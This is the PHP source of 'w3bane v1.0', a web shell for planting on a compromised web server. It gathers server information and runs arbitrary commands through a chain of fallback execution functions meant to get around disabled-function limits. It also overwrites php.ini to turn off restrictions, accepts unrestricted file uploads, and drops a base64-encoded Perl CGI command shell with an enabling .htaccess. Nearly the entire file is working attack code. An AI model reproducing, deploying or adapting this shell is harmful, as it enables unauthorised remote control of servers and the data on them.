<?php $title = "w3bane v1.0"?>
<html>
        <head>
                <link rel="icon" type="image/png" href="http://s28.postimg.org/pse8y5d09/favicon.png">
                <title>
                        <?php echo $title; ?>
                </title>
                <style>

                        #box{
                                padding: 5px 5px 5px 40px;
                                text-align: left;
                                background: black;
                                color: #A4A4A4;
                                height: 50%;
                                width: 50%;
                                overflow-y: auto;
                                border: solid 1px;
                                border-color: #151515


                                }
                        #except{
                                text-align: center;
                                color: red;
                                background-color; #0A0A0A;
                                font-size:12;
                                -webkit-box-shadow:5px 5px 5px black;
                                -moz-box-shadow: 5px 5px 5px black;
                                box-shadow:5px 5px 5px black;
                                -webkit-box-shadow:0 0 15px red;
                                -moz-box-shadow: 0 0 15px red;
                                box-shadow:0 0 15px red;
                        }
                        #shadow{
                                -webkit-box-shadow:5px 5px 5px black;
                                -moz-box-shadow: 5px 5px 5px black;
                                box-shadow:5px 5px 5px black;
                                -webkit-box-shadow:0 0 15px #151515;
                                -moz-box-shadow: 0 0 15px #151515;
                                box-shadow:0 0 15px #151515;
                        }
                        #cmdform
                                {
                                margin-top: 3%;
                                color: #A4A4A4;
                                width: 40%;
                                }

                        a{
                                color: firebrick;
                        }
                        a:hover{
                                background-color:white;
                        }
                        body{


                                margin: 2%;
                                color: white;
                                background: #0A0A0A;
                                font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;

                                }
                        #error
                                {
                                color: red;
                                font-weight: solid;

                                }
                        #ok
                                {
                                color: #0B6121;
                                font-weight: solid;

                                }
                        #warn
                                {
                                color: yellow;
                                font-weight: solid;

                                }
                        .offscreen {
                                position: absolute;
                                top: -30em;
                                left: -300em;
                                }

                        div#hmenu {
                                margin: 0;
                                padding: .3em 0 .3em 0;
                                background: #151515;
                                width: 100%;
                                text-align: center;
                                }

                        div#hmenu ul {
                                list-style: none;
                                margin: 0;
                                padding: 0;
                                }

                        div#hmenu ul li
                                {
                                margin: 0;
                                padding: 0;
                                display: inline;
                                }

                        div#hmenu ul a:link{
                                margin: 0;
                                padding: .3em .4em .3em .4em;
                                text-decoration: none;
                                font-weight: bold;
                                font-size: medium;
                                color: #E6E6E6;
                                }

                        div#hmenu ul a:visited{
                                margin: 0;
                                padding: .3em .4em .3em .4em;
                                text-decoration: none;
                                font-weight: bold;
                                font-size: medium;
                                color: #A4A4A4;
                                }

                        div#hmenu ul a:active{
                                margin: 0;
                                padding: .3em .4em .3em .4em;
                                text-decoration: none;
                                font-weight: bold;
                                font-size: medium;
                                color: firebrick;
                                }

                        div#hmenu ul a:hover{
                                margin: 0;
                                padding: .3em .4em .3em .4em;
                                text-decoration: none;
                                font-weight: bold;
                                font-size: medium;
                                color: white;
                                background-color: firebrick;
                                }
                        h2
                        {
                                background-color: black;
                                padding-right: 50%;
                        }
                        input[type="text"]
                                {
                                width: 80%;
                                color: #A4A4A4;
                                background-color: black;
                                font-size: 15px;
                                border-color: #151515;
                                }
                         #top
                                {
                                position: fixed;
                                top: 12px; right: 20px;
                                padding:auto;
                                font-size:10px;
                                color: #A4A4A4;
                                }
                        input[type=submit]
                                {
                                padding:5px 15px; background:#151515; border:0 none;
                                cursor:pointer;
                                color: #4682B4;
                                -webkit-border-radius: 5px;
                                border-radius: 5px; }
                        #footer {
                                position: absolute;
                                left: 0;
                                bottom: 0;
                            height: 100px;
                                width: 100%;
                                        }
                </style>
        </head>
        <body OnLoad="document.cmd.cmd.focus();">

        <!--
        @Server Information Gathering module
        @coded by madcodE
        !-->

        <div id="top">
        <?php
/*
@author madcodE
Check if user provide workspace directory in url
if Yes, check if its valid
if valid, change working directory
else
Show exception and stay in same directory
 */

if (isset($_GET['pwd'])) {
	$pwd = $_GET['pwd'];
	if (!@chdir($_GET['pwd'])) {
		echo "<div id='except'>Error: Couldn't read directory</div>";
		$pwd = getcwd();
	}
} else {

	$pwd = @getcwd();

}

echo "Connected from: <span id='error'>" . $_SERVER['REMOTE_ADDR'] . "
                </span> Connected to <span id='warn'>" . gethostbyname($_SERVER['SERVER_NAME']) . "</span>
                <br>
                Kernal: <span id='ok'>" . @php_uname() . "</span><br>";

/*

	                Getting sperate directory paths by exploding pwd variable
	                merging breadcrumb variable

*/
$dirs = explode('/', $pwd);
while (count($dirs) > 0) {
	$link = implode($dirs, '/');
	$text = array_pop($dirs);
	@$breadcrumb = "<a href='?action=cmd&pwd=$link'>$text</a>" . $breadcrumb;
	if (count($dirs) > 0) {
		$breadcrumb = '  ' . $breadcrumb;
	}
}

echo "pwd: " . @$breadcrumb;
$disable = @ini_get("disable_functions");
echo "<br>Disabled functions: <span id='error'>" . $disable . "</span>";

?>
        </div>

                <!--

                Server information gathering
                ends here

                -->
                <center>
        <h2><img src="http://s29.postimg.org/515zrqe6v/webane.jpg" height=100 title="w3bane v1.0 by madcodE"></h2>

        <div id="hmenu">
                        <ul>
                         <li><a href="?action=cgi">CGI Bypass</a></li>
                         <li><a href="?action=upload">Upload</a></li>

                        </ul>
                </div>


</html>
                        <?php
error_reporting(0);
/*
	                        @title w3bane v1.0
	                        @author madcodE
	                        @email  ahsan_private [@] hotmail.com
*/
function base64bypass() {
	$code = "IyFDOi9wZXJsNjQvYmluL3BlcmwuZXhlCiMhL3Vzci9iaW4vcGVybAp1c2UgQ29uZmlnOwp1c2UgQ0dJOwp1c2UgU3lzOjpIb3N0bmFtZTsKbXkgJGNnaSA9IG5ldyBDR0k7CiRob3N0ID0gaG9zdG5hbWU7CnByaW50ICRjZ2ktPmhlYWRlcigndGV4dC9odG1sJyk7CnByaW50IDw8RU5ESFRNTDsKPGxpbmsgaHJlZj0naHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVBsYXknIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPgo8c3R5bGU+CmJvZHl7CmZvbnQtZmFtaWx5OiAnUGxheScsIHNhbnMtc2VyaWY7CmNvbG9yOiBncmV5OwpiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsKYmFja2dyb3VuZC1pbWFnZTogdXJsKCdodHRwOi8vaS5pbWd1ci5jb20veUpKejFoay5qcGcnKTsKYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsKYmFja2dyb3VuZC1zaXplOjEwMCU7CnBhZGRpbmc6NSU7fQoKI2JveHsKaGVpZ2h0OjUwJTsKd2lkdGg6NTAlOwpjb2xvcjogZ3JleTsKYmFja2dyb3VuZC1jb2xvcjpibGFjazsKb3ZlcmZsb3c6IHNjcm9sbDsKYm9yZGVyOiBzb2xpZCAxcHg7Cn0KCjwvc3R5bGU+CjxoMT4KVzNiYW5lIENHSSAKPC9oMT4KCkVOREhUTUwKIyBhdXRob3I6IG1hZGNvZEUgKGZiLmNvbS9haHNhbi5saW51eCkKIyBJIGhlcmVieSB0YWtlIG5vIHJlc3BvbnNpYmlsdHkgb2YgYW55IG9mIHRoZSBhY3Rpb24gdGFrZW4gYWdhaW5lc3QgYW55dGhpbmcgb3IgYW55Ym9keSB1c2luZyB0aGlzIHNjcmlwdC4KIyBJdCBpcyBlbmQgdXNlciByZXNwb25zaWJpbHR5IHRoYXQgSG93IHRoZSBzY3JpcHQgaXMgdXNlZC4gCgoKCmlmIChkZWZpbmVkICRjZ2ktPnBhcmFtKCdydW4nKSkgewogbXkgJXBhcmFtcyA9ICRjZ2ktPlZhcnM7CiBwcmludCAiJGhvc3QgOiAke3BhcmFtc3tjbWR9fTxicj4iOwogcHJpbnQgIjxkaXYgaWQ9J2JveCc+PHByZT4iOwogc3lzdGVtKCR7cGFyYW1ze2NtZH19KTsKIHByaW50ICI8L3ByZT48L2Rpdj4iOwogCiAKIAp9IAoKcHJpbnQgPDxFTkRIVE1MOwo8SFRNTD4KPEhFQUQ+CjxUSVRMRT53M2JhbmUgYnkgbWFkY29kRTwvVElUTEU+CjwvSEVBRD4KPEJPRFk+CjxGT1JNIE1FVEhPRD1QT1NUIEFDVElPTj0iIj4KQ29tbWFuZDogPElOUFVUIFRZUEU9VEVYVCBOQU1FPSJjbWQiPgo8SU5QVVQgVFlQRT1TVUJNSVQgIHZhbHVlPSJEZXRvbmF0ZSIgTkFNRT0icnVuIj4KPC9GT1JNPgo8L0JPRFk+CjwvSFRNTD4KCkVOREhUTUw=";
	$htaccess = "T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQoKQWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLWNnaSAueHBsCgpBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLnhwbApBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLnhwbA==";
	$dir = "madcode";
	/*
		                                        check if directory name madcodE exist
		                                        if exist do nothing, continue
		                                        if not, create one.

	*/
	if (!file_exists($dir)) {
		mkdir($dir);
	}

	/**
	try to write .htaccess file
	.htaccess if is the custom apache conf file.

	 **/

	if ($myfile = fopen($dir . "/.htaccess", "w")) {
		$data = base64_decode($htaccess);
		fwrite($myfile, $data);
		fclose($myfile);
		echo "[+] htaccess Written <br>";

	}
	/**
	try to write madcode.xpl
	madcode.xpl if is the cgi script to bypass php limitations.

	 **/
	if ($myfile = fopen($dir . "/madcode.xpl", "w")) {
		$data = base64_decode($code);
		fwrite($myfile, $data);
		fclose($myfile);
		echo "[+] Shell Written <br>";
	}

	chdir($dir); #change directory to madcodE

	/*
		                                        try to make m a d c o d e .xpl file executeable

	*/
	if (chmod("madcode.xpl", 0751)) {
		echo "[+] Making Executable <br>";
		echo "<a href=" . $dir . "/madcode.xpl target='_blank'>  Go for it</a>";
	}

}
/**

@author Ahsan Shabbir a.k.a madcodE;
This function is use to bypass various execution limitations.
Some functions might be blocked by web server admin for security reasons.
This function help in bypassing these limitations by trying different approaches.

 **/
function shellexec($cmd) {
	echo "<b><span id='ok'>" . $cmd . "</span></b><br>";
	if (function_exists('system')) {
		@ob_start();@system($cmd);
		$hfp = @ob_get_contents();
		$hfp = @ob_get_contents();@ob_end_clean();
		return $hfp;} elseif (function_exists('passthru')) {
		@ob_start();@passthru($cmd);
		$hfp = @ob_get_contents();@ob_end_clean();return $hfp;} elseif (function_exists('exec')) {
		@exec($cmd, $results);
		$hfp = "";foreach ($results as $result) {$hfp .= $result;}
		return $hfp;} elseif (function_exists('shell_exec')) {$hfp = @shell_exec($cmd);return $hfp;} elseif (function_exists('popen')) {
		$fp = popen($cmd, 'r');
		$hfp = fread($fp, 1024);
		pclose($fp);return $hfp;} elseif (function_exists('proc_open')) {
		$proc = proc_open($cmd, array(array("pipe", "r"), array("pipe", "w"), array("pipe", "w")),
			$pipes);return stream_get_contents($pipes[1]);} else {echo "<span id='error' couldn't execute command</span>";}
}
/**
This function is use to upload files on the server
But this part only contain its html code.
 **/

function upload() {
	?>
                                <body onload="command.focus()">
                                <form enctype="multipart/form-data" action="?action=upload" method="POST">
                                <input type="hidden" name="MAX_FILE_SIZE" value="900000" />
                                <input name="uploaded" type="file" />
                                <input type="submit" value="Upload" />
                                </form>
                        <?php

}

?>
                <div id="cmdform">
                                <form name="cmd" method="POST" action="?action=cmd&pwd=<?php echo $pwd; ?>">
                                &dollar;&nbsp;<input type="text" name="cmd">
                                <input type="submit" title="Bomb" value="Detonate">
                                </form>
                </div>


<div id="box">
        <?php
/**

this code here try to enable functions
and turn off safe mode

 **/
if ($myfile = @fopen("php.ini", "w")) {
	#$data = $code;
	@$data = "disable_functions=none
                         safe_mode = Off";
	@fwrite($myfile, $data);
	@fclose($myfile);

}
if (isset($_GET['action'])) {
	$action = $_GET['action'];
} else {
	$action = "";
}
if ($action == "cgi") {
	# check if base64 functions are enabled. If enabled, try to call cgi bypass
	if (function_exists('base64_decode')) {

		base64bypass(); #calls base64bypass();

	} else {
		die("<span id='error'> Base64 Doesn't exist</span>");
	}
}
if ($action == "upload") {
	upload();
	if (isset($_FILES['uploaded'])) {
		$target_path = "./"; #Set same directory as target.
		$target_path = $target_path . basename($_FILES['uploaded']['name']);

		# Try to write files in the same directory

		if (move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
			#       if write file = ok
			echo "<span id='ok'> File uploaded successfully. </span>";
		} else {
			#   if fails to write.
			echo "<span id='error'>Error uploading file. </span>";
		}
	}

}
/**
check if user call for command execution
@author Ahsan Shabbir
 **/
if ($action == "cmd") {
	if (!isset($_POST['cmd']))
	#Set default command if no command is set.
	{
		$cmd = "ls -la";
	} else {
		$cmd = $_POST['cmd'];
	}
	# display result in preformatted text
	echo "<pre>" . shellexec($cmd) . "</pre>";

}

?>
</div>
        <br>
        <div id="shadow">
                <?php echo $title; ?> coded by madcodE &copy; 2015
        </div>

</html>